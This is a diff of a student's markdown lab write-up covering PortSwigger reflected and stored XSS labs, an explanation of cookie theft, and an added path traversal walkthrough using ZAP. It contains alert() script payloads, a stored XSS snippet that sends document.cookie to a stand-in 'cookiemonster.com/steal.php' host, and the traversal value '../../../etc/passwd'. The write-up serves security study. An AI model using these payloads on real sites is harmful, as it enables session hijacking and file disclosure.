@@ -184,15 +184,14 @@ Let the timestamps serve as adequate proof that it works!
 
 # C) PortSwigger Labs: [Reflected XSS](<https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded>)
 **Description**
-- Lab contains a simple reflected cross-site scripting vulnerability in the search functionality
+- There's a simple reflected cross-site scripting vulnerability present in the **search functionality**
 
 **Objective**
 - Perform a cross-site scripting attack that calls the `alert` function
 
 
-This one is pretty simple as it's just demonstrating the basic logic behind the vulnerability. 
-
-We first test that the webpage is vulnerable by using a very basic HTML tag and insert the following:
+## Reflecting
+We start by poking the search functionality with a very basic HTML (bold) tag:
 ```html
 <b>test</b>
 ```
@@ -201,13 +200,13 @@ Which returns a bolded "test":
 <img width="760" height="223" alt="2026-04-19-15:40:56" src="https://github.com/user-attachments/assets/5800f8fa-f743-4bbc-9a62-b5c4b7fd3a62" />
 
 
-We now suspect that the page is vulnerable to further exploits as the input is not handled correctly.
+We now suspect the page is vulnerable to further exploits as the input is not handled correctly.
 
 We exploit this by typing the following into the search field:
 ```html
 <script>alert('gotcha')</script>
 ```
-Press enter => script runs and we get the alert.
+Press enter => script runs and we get the alert ->
 
 <img width="604" height="231" alt="2026-04-19-15:43:41" src="https://github.com/user-attachments/assets/ce64f076-7419-4329-a15c-1b61705e367d" />
 
@@ -220,7 +219,10 @@ Notice the last part:
 ```url
 /?search=%3Cscript%3Ealert(%27gothca%27)%3C%2Fscript%3E
 ```
-The browser thinks that it's totally legit, as it's coming from a trusted source, so it executes the code. If we were to get a victim to use this URL, the "payload" would execute in their browser.
+The browser is unsuspecting as it's coming from a trusted source so it executes the code. If we were to get a victim to use this URL, the "payload" would execute in their browser.
+
+
+
 
 --------
 
@@ -236,8 +238,8 @@ The browser thinks that it's totally legit, as it's coming from a trusted source
 **Objective**
 - Submit a comment that calls out the `alert` function when the blog post is viewed
 
-
-Recall that in `stored XSS` the malicious script comes from the website's database. In this case the provided comment is not validated or encoded properly, so we can type almost anything we'd like and the website will store it as is in the database, everytime someone visits the blog post and the comments are loaded the script will run.
+## Storing Malicious Data
+Recall that in `stored XSS` the malicious script can come from the website's own database. In this case the provided comment is not validated or encoded properly, so we can input almost anything we'd like and the website will store it as is in the database. Every time someone visits the blog post and the comments are loaded -> the script will run.
 
 We type in the following:
 ```html
@@ -263,17 +265,17 @@ Now every time that specific blog post is opened:
 
 # E) xplain
 **Objective**
-- Explain using an example how an attacker might benefit from XSS
+- Explain how an attacker might benefit from XSS using an example
 
 
-Let's build on the previous task and say a website is vulnerable to cross-site scripting, specifically the comment section. An attacker can utilize this by posting the following comment:
+Let's build on the previous task and say a website is vulnerable to cross-site scripting, specifically the comment section. An attacker might exploit this by posting the following comment:
 ```html
 <script>
   var img = new Image();
   img.src = 'http://cookiemonster.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
 </script>
 ```
-This is a `Stored XSS attack`, as the malicious script is now stored in the websites database. When users visit the webpage where the **contaminated database record** is loaded, the script is run, effectively stealing their cookie. This is active exfiltration, as the script grabs the cookie and physically sends it to an attackers server.
+This is a `Stored XSS attack`, as the malicious script is now stored in the websites database. When users visit the webpage where the **contaminated database record** is loaded -> the script is run, effectively stealing their cookie. This is active exfiltration, as the script grabs the cookie and physically sends it to an attackers server.
 
 Depending on the extracted cookie, and attacker might be able to 
 - Hijack the session (import the cookie into their own browser and send requests with it, impersonating the victim user)
@@ -300,6 +302,29 @@ Source can be found [here](<https://eitca.org/cybersecurity/eitc-is-wapt-web-app
 **Objective**
 - Retrieve contents of the `/etc/passwd` file
 
+
+## Travelling
+I added a new entry into `Proxy by Patterns` to include lab traffic: `*web-security-academy.net*`
+
+We now open the lab and let ZAP listen in.
+
+When we open the lab we're faced with a basic shopping site, so we open up an entry.
+
+I then went to ZAP and inspected the GET request, I found the following:
+```html
+GET https://0a7800560313d02980ee44ae00d30027.web-security-academy.net/image?filename=7.jpg HTTP/1.1
+```
+The website is loading a picture (`7.jpg` to be exact) to go along with the product. The content is served from a directory (presumably holding images), which we can now try to escape.
+
+We copy the original GET request and paste it in ZAP into the request field via `Requester`. 
+
+I then started modifying the `filename` value, basically brute forcing it until we got a match, the final filename became `../../../etc/passwd`.
+
+<img width="1624" height="718" alt="2026-04-19-22:07:55" src="https://github.com/user-attachments/assets/e4ef747a-b63a-4f0e-9233-894af24639e8" />
+
+The server basically read the filepath as is, and did exactly as told.
+
+<img width="348" height="114" alt="2026-04-19-22:12:28" src="https://github.com/user-attachments/assets/dc987a73-e63a-40b3-ae5f-bd35a473db10" />
 
 
 
